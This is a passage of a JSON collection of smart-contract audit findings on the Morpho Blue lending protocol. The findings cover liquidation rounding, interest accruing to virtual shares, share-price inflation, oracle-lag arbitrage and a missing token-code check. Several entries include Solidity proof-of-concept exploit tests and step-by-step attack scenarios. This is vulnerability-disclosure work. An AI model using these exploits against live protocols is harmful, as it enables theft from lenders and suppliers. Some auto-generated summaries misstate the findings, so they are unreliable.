      "finders": [
        "Christoph Michel"
      ]
    },
    {
      "id": "40873",
      "title": "Liquidation seizeassets computation rounding issue ",
      "impact": "MEDIUM",
      "content": "## Morpho.sol#L375-L376\n\n## Description\n\nCurrently, liquidations can end up with the borrower having a less healthy position than before the liquidation (even without liquidation incentive and favorable LLTV). Note that the borrower position is measured in shares (not assets) via `position[id][borrower].borrowShares`. The `repaidAssets` are rounded up from the borrow shares position to be burned, and the rounded-up assets are used to compute the collateral assets to be seized (`seizedAssets`), leading to a situation of reducing the borrower's collateral by much more than their debt position was actually reduced by.\n\n```plaintext\nrepaidAssets = repaidShares.toAssetsUp(market[id].totalBorrowAssets, market[id].totalBorrowShares); // uses rounded-up repaidAssets\nseizedAssets = repaidAssets.wMulDown(liquidationIncentiveFactor).mulDivDown(ORACLE_PRICE_SCALE, collateralPrice);\n```\n\n## Example\n\n- **LLTV of 75%**. Borrow share price (`totalBorrowAssets / totalBorrowShares`) of `1.01e-6=0.00000101` (1% interest on initial virtual shares start price of `0.000001`). Price of 1 borrow asset = 1$.\n\n  - **Borrower**: Collateral worth 4$. 3e6 borrow shares, worth 3.03 assets. Health factor is calculated as follows:\n\n    ```plaintext\n    Health Factor = 4$ * LLTV / (3e6 * 1.01e-6 * 1$) = 0.99\n    ```\n\n  - A liquidator that pays back `repaidShares=1` receives seized assets according to:\n\n    ```plaintext\n    repaidAssets = repaidShares.toAssetsUp(sharePrice) = 1 (1$)\n    ```\n\n    This is more than the actual value of `0.00000101$` corresponding to the 1 borrow shares position reduction.\n\n  - The borrower's collateral is reduced to 3$ while only 1 borrow share was burned from their position. Their new health factor drops to:\n\n    ```plaintext\n    New Health Factor = 3$ * LLTV / ((3e6-1) * 1.01e-6 * 1$) = 0.7425\n    ```\n\n    This makes the borrower less healthy.\n\n  - Another three rounds of liquidations of `repaidShares=1` will lead to a health factor of:\n\n    ```plaintext\n    Health Factor = 0$ * LLTV / ((3e6-4) * 1.01e-6 * 1$) = 0\n    ```\n\n    The borrower's collateral was fully seized and the protocol incurs bad debt of almost the entire initial debt shares worth:\n\n    ```plaintext\n    Bad Debt = (3e6-4) * 1.01e-6 * 1$ = 3.03$\n    ```\n\nThe impact is that an unhealthy borrowers position can be fully liquidated by splitting up liquidations into tiny liquidations (each repaying only 1 share but seizing the full rounded-up repay amount of collateral) while not reducing their actual asset debt position. The protocol will incur almost the entire initial borrow debt assets as bad debt.\n\n## Recommendation\n\nThe code should look at two different kinds of `repaidAssets`: one that gets reduced from the total assets and that the liquidator has to pay, which should be rounded up (matches the current `repaidAssets`, aka the \"repay\" part of the liquidation). The second one is used to compute the value for the seized assets, which should be rounded down. The liquidator has an incentive to do this because they earn the liquidation incentive on the entire repaid amount (and the repaid amount is such that they can seize the entire collateral.\n\n```plaintext\nrepaidAssets = repaidShares.toAssetsUp(market[id].totalBorrowAssets, market[id].totalBorrowShares); // don't use repaidAssets here, should round down\nseizedAssets = repaidShares.toAssetsDown(market[id].totalBorrowAssets, market[id].totalBorrowShares)\n              .wMulDown(liquidationIncentiveFactor).mulDivDown(ORACLE_PRICE_SCALE, collateralPrice);\n```\n\n## Proof of Concept\n\n```solidity\nfunction testFullLiquidationAttack() public {\n    LiquidateTestParams memory params = LiquidateTestParams({\n        amountCollateral: 400,\n        amountSupplied: 100e18,\n        // maxBorrow = uint256(position[id][borrower].collateral).mulDivDown(collateralPrice, ORACLE_PRICE_SCALE).wMulDown(marketParams.lltv);\n        amountBorrowed: 300,\n        priceCollateral: 1e36,\n        lltv: 0.75e18\n    });\n\n    _setLltv(params.lltv);\n    _supply(params.amountSupplied);\n    oracle.setPrice(params.priceCollateral);\n\n    // create some borrows as they would happen in a normal market, to initialize borrow share price to some real value\n    loanToken.setBalance(REPAYER, type(uint128).max); // * 2 for interest\n    collateralToken.setBalance(REPAYER, 1000e18);\n    \n    vm.startPrank(REPAYER);\n    morpho.supplyCollateral(marketParams, 1000e18, REPAYER, hex\"\");\n    morpho.borrow(marketParams, params.amountSupplied - params.amountBorrowed, 0, REPAYER, REPAYER);\n    vm.stopPrank();\n\n    // create BORROWER's debt position\n    loanToken.setBalance(LIQUIDATOR, params.amountBorrowed * 2); // * 2 for interest\n    collateralToken.setBalance(BORROWER, params.amountCollateral);\n    \n    vm.startPrank(BORROWER);\n    morpho.supplyCollateral(marketParams, params.amountCollateral, BORROWER, hex\"\");\n    morpho.borrow(marketParams, params.amountBorrowed, 0, BORROWER, BORROWER);\n    vm.stopPrank();\n\n    // move oracle by a tiny bit for BORROWER to become unhealthy\n    oracle.setPrice(params.priceCollateral - 0.01e18);\n\n    // multi liquidate\n    vm.startPrank(LIQUIDATOR);\n    uint256 seizedAssets = 0;\n    uint256 repaidAssets = 0;\n\n    do {\n        uint256 sharesToRepay = 1;\n        (uint256 newSeizedAssets, uint256 newRepaidAssets) = morpho.liquidate(marketParams, BORROWER, 0, sharesToRepay, hex\"\");\n        seizedAssets += newSeizedAssets;\n        repaidAssets += newRepaidAssets;\n\n        // console2.log(\"newSeizedAssets\", newSeizedAssets);\n        // console2.log(\"newRepaidAssets\", newRepaidAssets);\n        // console2.log(\"collateral remaining\", morpho.collateral(marketParams.id(), BORROWER));\n    } while(morpho.collateral(marketParams.id(), BORROWER) > 1);\n\n    // Results\n    console2.log(\"======== Results ========\");\n    uint256 remainingDebt = morpho.expectedBorrowAssets(marketParams, BORROWER);\n    console2.log(\"remaining borrow shares\", morpho.borrowShares(marketParams.id(), BORROWER));\n    console2.log(\"remainingDebt\", remainingDebt);\n}\n```",
      "summary": "\nThis bug report discusses an issue with liquidations in the Morpho.sol code. Currently, the liquidation process can result in the borrower having a less healthy position than before the liquidation, even without any liquidation incentive or favorable loan-to-value ratio. This is because the borrower's position is measured in shares, not assets, and the repaid assets are rounded up from the borrow shares position. This leads to a situation where the borrower's collateral is reduced by more than their debt position was actually reduced by. This can be exploited by a liquidator, allowing them to fully liquidate an unhealthy borrower by splitting up the liquidations into tiny amounts.\n\nThe recommendation is to update the code to use two different types of repaid assets - one that gets reduced from the total assets and one used to compute the value for the seized assets. The liquidator would have an incentive to do this because they earn the liquidation incentive on the entire repaid amount. To demonstrate this issue, a proof of concept was provided where a borrower's debt position was fully liquidated by using tiny liquidations, resulting in the protocol incurring almost the entire initial debt as bad debt.\n\nThe results of the proof of concept showed that the borrower's remaining debt was significantly higher than expected, demonstrating the severity of this bug. It is recommended that the code be updated to prevent this issue from occurring in the future.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_blue_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "solthodox",
        "Christoph Michel",
        "trachev",
        "john-femi"
      ]
    },
    {
      "id": "40872",
      "title": "Virtual borrow shares accrue interest and lead to bad debt ",
      "impact": "MEDIUM",
      "content": "## Morpho.sol#L478\n\n## Description\nThe virtual borrow shares, that are not owned by anyone, earn interest in *accrueInterest*. This interest keeps compounding and cannot be repaid as the virtual borrow shares are not owned by anyone. As the withdrawable funds are computed as `supplyAssets - borrowAssets`, the borrow shares' assets equivalent leads to a reduction in withdrawable funds, essentially creating bad debt. Note that while the initial borrow shares only account for 1 asset, this can be increased by raising the share price. The share price can be inflated arbitrarily high; see appendix.\n\n## Recommendation\nThere is no virtual collateral equivalent, and therefore the virtual borrow assets are bad debt that cannot even be repaid and socialized. The virtual borrow shares should not earn interest.\n\n## Appendix: Increasing the Borrow Share Price\n```solidity\nfunction testBorrowInflationAttack() public {\n    uint256 amountCollateral = 1e6 ether;\n    _supply(amountCollateral);\n    oracle.setPrice(1 ether);\n    collateralToken.setBalance(BORROWER, amountCollateral);\n    vm.startPrank(BORROWER);\n    morpho.supplyCollateral(marketParams, amountCollateral, BORROWER, hex\"\");\n    morpho.borrow(marketParams, 1e4, 0, BORROWER, RECEIVER);\n    \n    for (uint256 i = 0; i < 100; i++) {\n        // assets = shares * (totalBorrowAssets + 1) / (totalBorrowShares + 1e6) < 1 <=> shares < (totalBorrowShares + 1e6) / (totalBorrowAssets + 1).\n        (,, uint256 totalBorrowAssets, uint256 totalBorrowShares) = morpho.expectedMarketBalances(marketParams);\n        console2.log(\"totalBorrowShares\", totalBorrowShares);\n        uint256 shares = (totalBorrowShares + 1e6).mulDivUp(1, totalBorrowAssets + 1) - 1;\n        console2.log(\"shares\", shares);\n        (uint256 returnAssets, uint256 returnShares) = morpho.borrow(marketParams, 0, shares, BORROWER, RECEIVER);\n        \n        uint256 borrowBalance = morpho.expectedBorrowAssets(marketParams, BORROWER);\n        // console2.log(\"borrowBalance\", borrowBalance);\n    }\n    \n    (,, uint256 totalBorrowAssets, uint256 totalBorrowShares) = morpho.expectedMarketBalances(marketParams);\n    console2.log(\"final totalBorrowShares\", totalBorrowShares);\n    vm.expectRevert(\"max uint128 exceeded\");\n    morpho.borrow(marketParams, 1 ether, 0, BORROWER, RECEIVER);\n}\n```",
      "summary": "\nThe bug report is about a function called _accrueInterest in the code Morpho.sol#L478. This function causes virtual borrow shares to earn interest even if they are not owned by anyone. This interest keeps compounding and cannot be repaid, leading to a reduction in withdrawable funds. This is because the function calculates withdrawable funds as supplyAssets - borrowAssets, and the interest earned by the virtual borrow shares increases the borrow assets, resulting in bad debt. The report recommends that the virtual borrow shares should not earn interest as there is no way to repay them. The report also mentions an appendix that shows how the borrow share price can be inflated, leading to an attack on the system. The code provided in the appendix demonstrates how the share price can be increased, resulting in an infinite loop and causing the system to crash. The report concludes by stating that the borrow shares should not earn interest as they are bad debt and cannot be repaid.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_blue_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Christoph Michel",
        "xuwinnie"
      ]
    },
    {
      "id": "40871",
      "title": "Virtual supply shares steal interest ",
      "impact": "MEDIUM",
      "content": "## Context\nMorpho.sol#L479\n\n## Description\nThe virtual supply shares, that are not owned by anyone, earn interest in *accrueInterest*. This interest is stolen from the actual suppliers which leads to loss of interest funds for users. Note that while the initial share price of 1e-6 might make it seem like the virtual shares can be ignored, one can increase the supply share price and the virtual shares will have a bigger claim on the total asset percentage.\n\n## Recommendation\nThe virtual shares should not earn interest as they don't correspond to any supplier.\n\n## Appendix: Increasing Supply Share Price\n```solidity\nfunction testSupplyInflationAttack() public {\n    vm.startPrank(SUPPLIER);\n    loanToken.setBalance(SUPPLIER, 1 * 1e18);\n    // 100x the price. in the end we end up with 0 supply and totalAssets = assets supplied here\n    morpho.supply(marketParams, 99, 0, SUPPLIER, \"\");\n    uint256 withdrawals = 0;\n    for (;; withdrawals++) {\n        (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = morpho.expectedMarketBalances(marketParams);\n        // console2.log(\"totalSupplyShares\", totalSupplyShares);\n        uint256 shares = (totalSupplyShares + 1e6).mulDivUp(1, totalSupplyAssets + 1) - 1;\n        // console2.log(\"shares\", shares);\n        // burn all of our shares, then break\n        if (shares > totalSupplyShares) {\n            shares = totalSupplyShares;\n        }\n        if (shares == 0) {\n            break;\n        }\n        morpho.withdraw(marketParams, 0, shares, SUPPLIER, SUPPLIER);\n    }\n    (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = morpho.expectedMarketBalances(marketParams);\n    console2.log(\"withdrawals\", withdrawals);\n    console2.log(\"totalSupplyAssets\", totalSupplyAssets);\n    console2.log(\"final share price %sx\", (totalSupplyAssets + 1) * 1e6 / (totalSupplyShares + 1e6));\n    // without inflation this should mint at initial share price of 1e6, i.e., 100 asset\n    (uint256 returnAssets,) = morpho.supply(marketParams, 0, 1 * 1e6, SUPPLIER, \"\");\n    console2.log(\"pulled in assets \", returnAssets);\n}\n```",
      "summary": "\nThis bug report is about a problem in the code for a virtual supply feature in the Morpho.sol file. The virtual supply shares, which are not owned by anyone, are earning interest in a function called _accrueInterest. This is causing a loss of interest funds for users because the interest is being taken from the actual suppliers. The report suggests that the virtual shares should not earn interest as they do not correspond to any supplier. The report also includes a code snippet showing how the bug can be exploited to increase the supply share price and give the virtual shares a bigger claim on the total asset percentage. The report recommends fixing this issue and provides a code example to demonstrate the expected behavior.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_blue_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Christoph Michel"
      ]
    },
    {
      "id": "40870",
      "title": "Suppliers can be tricked into supplying more ",
      "impact": "MEDIUM",
      "content": "## Morpho.sol Attack Overview\n\n## Context\nMorpho.sol#L214\n\n## Description\nThe supply and withdraw functions can increase the supply share price (totalSupplyAssets / totalSupplyShares). If a depositor uses the shares parameter in supply to specify how many assets they want to supply, they can be tricked into supplying more assets than they intended. It's easy to inflate the supply share price by 100x through a combination of a single supply of 100 assets and then withdrawing all shares without receiving any assets in return. \n\nThe reason is that in withdraw, we compute the assets to be received as:\n\n```\nassets = shares.toAssetsUp(market[id].totalSupplyAssets, market[id].totalSupplyShares);\n```\n\nNote that `assets` can be zero, and the withdraw essentially becomes a pure burn function.\n\n## Example\n- A new market is created.\n- The victim tries to supply 1 asset at the initial share price of 1e-6 and specifies `supply(shares=1e6)`. They have already given max approval to the contract because they supplied the same asset to another market.\n- The attacker wants to borrow a lot of the loan token and therefore targets the victim. They front-run the victim by executing `supply(assets=100)` and a sequence of `withdraw()` functions such that `totalSupplyShares = 0` and `totalSupplyAssets = 100`. The new supply share price increases 100x.\n- The victim's transaction is minted, and they use the new supply share price to mint 100x more tokens than intended (possible because of the max approval).\n- The attacker borrows all the assets.\n- The victim is temporarily locked out of that asset. They cannot withdraw again because of the liquidity crunch (it is borrowed by the attacker).\n\n## Recommendation\nSuppliers should use the assets parameter instead of shares whenever possible. In cases where shares must be used, they need to ensure to approve only the maximum amount they want to spend. Alternatively, consider adding a slippage parameter `maxAssets` that is the maximum amount of assets that can be supplied and transferred from the user. This attack of inflating the supply share price is especially possible when there are only a few shares minted, i.e., at market creation or when an attacker or contract holds the majority of shares that can be redeemed.\n\n## Proof of Concept\n```solidity\nfunction testSupplyInflationAttack() public {\n    vm.startPrank(SUPPLIER);\n    loanToken.setBalance(SUPPLIER, 1 * 1e18);\n    // 100x the price. in the end we end up with 0 supply and totalAssets = assets supplied here\n    morpho.supply(marketParams, 99, 0, SUPPLIER, \"\");\n    uint256 withdrawals = 0;\n    for (;; withdrawals++) {\n        (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = morpho.expectedMarketBalances(marketParams);\n        uint256 shares = (totalSupplyShares + 1e6).mulDivUp(1, totalSupplyAssets + 1) - 1;\n        // burn all of our shares, then break\n        if (shares > totalSupplyShares) {\n            shares = totalSupplyShares;\n        }\n        if (shares == 0) {\n            break;\n        }\n        morpho.withdraw(marketParams, 0, shares, SUPPLIER, SUPPLIER);\n    }\n    (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = morpho.expectedMarketBalances(marketParams);\n    console2.log(\"withdrawals\", withdrawals);\n    console2.log(\"totalSupplyAssets\", totalSupplyAssets);\n    console2.log(\"final share price %sx\", (totalSupplyAssets + 1) * 1e6 / (totalSupplyShares + 1e6));\n    // without inflation this should mint at initial share price of 1e6, i.e., 1 asset\n    (uint256 returnAssets,) = morpho.supply(marketParams, 0, 1 * 1e6, SUPPLIER, \"\");\n    console2.log(\"pulled in assets \", returnAssets);\n}\n```\n\n## Log\n- `withdrawals`: 459\n- `totalSupplyAssets`: 99\n- `final share price`: 100x\n- `pulled in assets`: 100",
      "summary": "\nThis bug report discusses an issue with the supply and withdraw functions in the Morpho.sol contract. It explains that these functions can be used to inflate the supply share price, which can trick depositors into supplying more assets than they intended. The report provides an example of how this attack can be carried out and recommends that suppliers use the assets parameter instead of shares whenever possible. It also suggests adding a slippage parameter to limit the amount of assets that can be supplied. The report includes a proof of concept and logs showing the impact of the attack.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_blue_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Christoph Michel"
      ]
    },
    {
      "id": "40869",
      "title": "Deviation in oracle price could lead to arbitrage in high lltv markets ",
      "impact": "MEDIUM",
      "content": "## Morpho Blue: Understanding Borrowing Risks\n\n## Context\n- Morpho.sol#L521-L522\n- ChainlinkOracle.sol#L116-L121\n\n## Description\nIn Morpho Blue, the maximum amount a user can borrow is calculated using the conversion rate between `loanToken` and `collateralToken`, which is returned by an oracle:\n\n```solidity\nuint256 maxBorrow = uint256(position[id][borrower].collateral)\n    .mulDivDown(collateralPrice, ORACLE_PRICE_SCALE)\n    .wMulDown(marketParams.lltv);\n```\n\n`collateralPrice` is fetched by calling the oracle's `price()` function. For example, the `price()` function in `ChainlinkOracle.sol` is defined as follows:\n\n```solidity\nfunction price() external view returns (uint256) {\n    return SCALE_FACTOR.mulDiv(\n        VAULT.getAssets(VAULT_CONVERSION_SAMPLE) * BASE_FEED_1.getPrice() * BASE_FEED_2.getPrice(),\n        QUOTE_FEED_1.getPrice() * QUOTE_FEED_2.getPrice()\n    );\n}\n```\n\nHowever, all price oracles are susceptible to front-running as their prices tend to lag behind an asset's real-time price. More specifically:\n\n- Chainlink oracles are updated after the change in price crosses a deviation threshold (e.g., 2.5% in ETH/USD), which means a price feed could return a value slightly smaller or larger than an asset's actual price under normal conditions.\n- Uniswap V3 TWAP returns the average price over the past X number of blocks, meaning it will always lag behind the real-time price.\n\nAn attacker could exploit the difference between the price reported by an oracle and the asset's actual price to gain a profit by front-running the oracle's price update.\n\nFor Morpho Blue, this becomes profitable when the price deviation is sufficiently large for an attacker to open positions that turn into bad debt. Mathematically, arbitrage is possible when:\n\n```\nprice deviation > 1 / (LIF - LLTV)\n```\n\nThe likelihood of this condition being true is significantly increased when `ChainlinkOracle.sol` is used as the market's oracle with multiple Chainlink price feeds.\n\nAs seen from above, the conversion rate between `loanToken` and `collateralToken` is calculated with multiple price feeds, each having their own deviation threshold. This amplifies the maximum possible price deviation returned by `price()`.\n\n### Example Scenario:\n- Assume a market has WBTC as `collateralToken` and FTM as `loanToken`.\n- Assume the following prices:\n  - 1 BTC = 40,000 USD\n  - 1 FTM = 1 USD\n  - 1 ETH = 2,000 USD\n\nChainlinkOracle will be set up as follows:\n- BASE_FEED_1 - WBTC/BTC, 2% deviation threshold.\n- BASE_FEED_2 - BTC/USD, 0.5% deviation threshold.\n- QUOTE_FEED_1 - FTM/ETH, 3% deviation threshold.\n- QUOTE_FEED_2 - ETH/USD, 0.5% deviation threshold.\n\nAssume all price feeds are at their deviation threshold:\n- WBTC/BTC returns 98% of 1, which is 0.98.\n- BTC/USD returns 99.5% of 40,000, which is 39,800.\n- FTM/ETH returns 103% of 1/2,000, which is 0.000515.\n- ETH/USD returns 100.5% of 2,000, which is 2,010.\n\nThe actual conversion rate of WBTC to FTM is:\n\n```\n(0.98 * 39,800) / (0.000515 * 2,010) = 37,680\n```\ni.e., 1 WBTC = 37,680 FTM.\n\nCompared to 1 WBTC = 40,000 FTM, the maximum price deviation is 5.8%.\n\n### Arbitrage Demonstration:\nAssume the following:\n- A market has 95% LLTV, with WBTC as collateral and FTM as `loanToken`.\n- 1 WBTC is currently worth 40,000 FTM.\n\nIf the price of WBTC drops while FTM increases in value, resulting in 1 WBTC = 37,680 FTM, and all four Chainlink price feeds are at their respective deviation thresholds:\n\nAn attacker sees the price discrepancy and front-runs the oracle price update to:\n- Deposit 1 WBTC as collateral.\n- Borrow 38,000 FTM, which is the maximum they can borrow at 95% LLTV and 1 WBTC = 40,000 FTM conversion rate.\n\nAfterward, the oracle's conversion rate is updated to 1 WBTC = 37,680 FTM:\n- The attacker's position is now unhealthy as their collateral is worth less than their loaned amount.\n\nThe attacker back-runs the oracle price update to liquidate themselves:\n- At 95% LLTV, `LIF = 100.152%`.\n- To seize 1 WBTC, they repay 37,115 FTM:\n\n```\nseizedAssets / LIF = 1 WBTC / 1.0152 = 37,680 FTM / 1.0152 = 37,115 FTM\n```\n\nThey gain 885 FTM worth of profit using 37,680 FTM, which is a 2.3% arbitrage opportunity.\n\nThis example demonstrates the original condition for arbitrage to occur, as:\n\n```\nprice deviation - (1 / (LIF - LLTV)) = 5.8% - (1 / (100.152% - 95%)) = ~2.3%\n```\n\nNote that all profit gained from arbitrage causes a loss of funds for lenders as the remaining bad debt is socialized by them.\n\n## Recommendation\nConsider implementing a borrowing fee to mitigate against arbitrage opportunities. Ideally, this fee would be larger than the oracle's maximum price deviation to prevent arbitrage profits.\n\n### Further Mitigations Explored\n- Angle Protocol: Oracles and Front-Running\n- Liquity: The Oracle Conundrum",
      "summary": "\nThis bug report discusses an issue with the calculation of the maximum amount a user can borrow in the Morpho Blue platform. The calculation relies on the conversion rate between loanToken and collateralToken, which is determined by an oracle. However, all price oracles are susceptible to front-running, where the reported price lags behind the asset's actual price. This creates an opportunity for attackers to exploit the difference between the reported price and the actual price, leading to arbitrage opportunities. The report suggests implementing a borrowing fee to mitigate against these opportunities. Other protocols have also explored potential solutions to this issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_blue_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "MiloTruck"
      ]
    },
    {
      "id": "40868",
      "title": "Insucient non existent token check can be weaponised ",
      "impact": "HIGH",
      "content": "## Context: SafeTransferLib.sol\n\nIn `SafeTransferLib.sol`, it doesn't check if the token address provided has code or not. This means calling `SafeTransferFrom` with a token address that does not have any code does not revert.\n\nThere are multiple ways of knowing the address where a token will be deployed before it is actually deployed. The easiest way is to frontrun the token deployment transaction. Some tokens use `CREATE2` to deploy the token, which makes it possible as well.\n\n- An attacker can frontrun a token deployment transaction with the following:\n  - **CreateMarket** with a legitimate oracle, IRM, and `collateralToken`. Creating a legitimate oracle is not harder before token deployment, as the oracle providers usually take token addresses as input, and it is okay if it doesn't return the correct price before the `loanToken` is added in that oracle provider.\n  - Supply infinite tokens, which will succeed and update the internal balance of the attacker because of insufficient non-existent token checks.\n  \n- Now, the token gets actually deployed and victims deposit actual `loanTokens`. An attacker can withdraw these tokens since, according to internal accounting, they have supplied infinite tokens.\n\n- An attacker can do the same for `collateralToken` if they want to, as `supplyCollateral` is susceptible to the same attack.",
      "summary": "\nThe bug in SafeTransferLib.sol allows an attacker to withdraw tokens by exploiting the lack of code check for the token address. This can be achieved by frontrunning the token deployment transaction and supplying infinite tokens, which will update the attacker's internal balance. The attacker can then withdraw these tokens when the actual deployment occurs. This bug poses a medium risk and can also be exploited for collateralToken. ",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_blue_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "sorryNotsorry",
        "MiloTruck",
        "neumo",
        "kankodu",
        "pep7siup",
        "3doc",
        "sashik-eth",
        "rvierdiiev",
        "darkbit"
      ]
    },
    {
      "id": "54438",
      "title": "Incorrect comments for wExp(x) and errDelta ",
      "impact": "LOW",
      "content": "## Code Review Recommendations\n\n## Context\n- `MathLib.sol#L27`\n- `MathLib.sol#L35`\n- `MathLib.sol#L39`\n- `SpeedJumpIrm.sol#L125`\n\n## Description/Recommendation\n\n### MathLib.sol#L27\n- Current comment:\n  - `// Revert if x < -(2**255-1) + (ln(2)/2).`\n- Recommended change:\n  - `// Revert if x < -2**255 + (ln(2)/2).`\n\n### MathLib.sol#L35\nLet \\( \\epsilon_0 = \\text{LN2\\_INT} \\) and \\( \\epsilon_1 = \\text{LN2\\_INT} \\), then:\n\n\\[\n\\epsilon_0 q - x = \\epsilon_0 \\cdot \\text{sign}(x) \\frac{x \\pm \\epsilon_1}{\\epsilon_0} - x \\leq \\epsilon_1\n\\]\n\nIt is safe that \\( r \\) is calculated in an unchecked block. However, the comment below is not correct:\n- Current comment:\n  - `// Safe unchecked because |q * LN2_INT| <= |x|.`\n- Recommended change:\n  - The comment should mention \\( |q \\cdot \\text{LN2\\_INT} - x| \\leq \\frac{\\text{LN2\\_INT}}{2} \\). The main concern is for negative values of \\( x \\) since for positive ones we have a really small upper bound compared to `type(int256).max`. For negative values, \\( q \\cdot \\text{LN2\\_INT} \\) always ends up being more than `type(int256).min` due to the lower bound check for \\( x \\).\n\n### MathLib.sol#L39\nAlthough it is safe, the comment is not entirely correct as \\( r \\) is in 18 decimal format:\n\\[\n0.500788869818058638 \\cdot 10^{18} \\leq \\text{expR} \\leq 1.406630217019747831 \\cdot 10^{18}\n\\]\nand \\( \\text{expR} \\) is always positive.\n\n\\[\n\\text{expR} = 10^{18} + r + \\left\\lfloor \\frac{r^2}{10^{18}} \\right\\rfloor = 10^{18} \\left( 1 + \\frac{r}{2} + 1 \\right) + \\epsilon \\geq 0.5 \\cdot 10^{18} + \\epsilon\n\\]\n\nAbove, \\( |\\epsilon| < \\frac{3}{2} \\).\n\n### SpeedJumpIrm.sol#L125\n- Current status:\n  - `errDelta` would be in \\( 10^{18}[-2, 2] \\).\n- Recommendation:\n  - The smaller range of \\( 10^{18}[-1, 1] \\) needs to be proven.\n\n## Morpho\n- Fixed in PR 61.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_blue_irm_oct2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-mon and Natalie",
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "54437",
      "title": "Return early in wExp(x) when x is really small ",
      "impact": "LOW",
      "content": "## Context: MathLib.sol#L28\n\n## Description\nBased on the suggested bounds for x from issues/35:\n\n-8.352633645  1058  q  195 (or 196)\n\nSimilar to Remco's `FixedPointMathLib`, one could return 0 earlier when x is below a certain threshold.\n\n## Recommendation\nFor simpler analysis, it would be best to return 0 for small values of x below a certain threshold instead of having an underflow revert requirement.\n\n## Morpho\nFixed in PR 54.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_blue_irm_oct2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-mon and Natalie",
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "54436",
      "title": "Safe upper-bound for SPEED_FACTOR needs to be documented ",
      "impact": "LOW",
      "content": "## SpeedJumpIrm and Morpho Documentation\n\n## Context\n- **SpeedJumpIrm.sol**: Lines 131-135\n- **Morpho.sol**: Lines 456-459\n\n## Description\n**SPEED_FACTOR (kP)** is used in the calculation of `linearVariation`:\n\\[ L \\approx kP \\cdot \\text{err} \\cdot \\Delta t / 10^{18} \\]\n\n### Where:\n| Parameter | Description                   |\n|-----------|-------------------------------|\n| t        | Elapsed time                  |\n| L         | Linear variation               |\n| kP        | SPEED_FACTOR                  |\n| err       | Error                         |\n\n- Elapsed time would be at most `type(uint64).max` (since timestamps are accounted for, for example, in geth as `uint64`).\n- The error (err) is bounded by \\( 10^{18} \\).\n\n### Upper Bound Calculation\nFor `speed * int256(elapsed)` to be less than `type(int256).max`, the possible upper bound for `SPEED_FACTOR` would be:\n\\[ 2191 < 2255 - 1 \\]\n\\[ (2^{64} - 1) < 2192 \\]\n\nSo, for example, assigning `uint184` to `SPEED_FACTOR` or ensuring that `SPEED_FACTOR` is no more than 2191 in the constructor would suffice.\n\n### NatSpec Comments\nA typical value for the `SPEED_FACTOR` would be **10 ethers / 365 days**. This value is significantly lower than the suggested upper bound. It would be beneficial to document and implement this check.\n\n## MathLib.wExp\nRegarding the approximate exponentiation, the accepted upper bound is around **135 ethers** for `linearVariation`, which leads to the suggested upper bound:\n\\[ 135 \\cdot 10^{18} \\]\n\\[ (2^{64} - 1) \\approx 7.318364664277 \\dots \\]\n\nThis indicates that the accepted range of values for `SPEED_FACTOR` is very small unless there is an expected upper bound for the elapsed time. It's also crucial to ensure that the errors are sufficiently bounded and not too close to the WAD.\n\n### Important Controls\nThus, `SPEED_FACTOR`, elapsed time, and error need to be controlled.\n\n## Recommendation\nThe safe upper bound for `SPEED_FACTOR` needs to be documented. If parameters are not set carefully, funds could be frozen forever.\n\n### Morpho's Acknowledgment\nMorpho has agreed that this needs to be documented. A few remarks to keep in mind:\n- Err is bounded by \\( 1e^{18} \\) (note: your comment about being bounded by \\( 2e^{18} \\) applies to `errDelta`). We prefer not to impose bounds on `err` to allow the market to evolve freely, which seems like a reasonable approximation.\n- A bound of \\( 2^{64} \\) for the time elapsed seems unrealistic; it corresponds to **585 billion years**.\n- Ensuring that markets are updated yearly should not pose an issue, and this bound corresponds to reasonable values of the speed factor. The typical value mentioned is approximately **13 times lower**.\n\n### Constraints on `kP`\nIf `err` approaches \\( 10^{18} \\), we must have:\n\\[ kP \\cdot \\Delta t \\leq 135 \\cdot 10^{18} \\]\n\nBounding the elapsed time to one year gives an upper bound of **135 ethers per year**, which meets the typical value of **10 ethers per year**.\n\n### Interest Calculation in Morpho\nSafe bounds will also need to be estimated when calculating the interest in Morpho:\n```solidity\nuint256 borrowRate = IIrm(marketParams.irm).borrowRate(marketParams, market[id]);\nuint256 interest = 